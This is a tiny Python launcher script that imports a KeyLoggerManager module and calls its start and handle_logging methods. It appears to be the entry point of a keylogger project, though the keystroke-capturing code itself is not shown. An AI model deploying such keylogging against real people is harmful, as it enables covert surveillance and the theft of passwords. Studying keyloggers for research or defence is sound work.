from KeyLoggerManager import *

def main():
    key_logger = KeyLoggerManager()
    key_logger.start()
    key_logger.handle_logging()


if __name__ == "__main__":
    main()
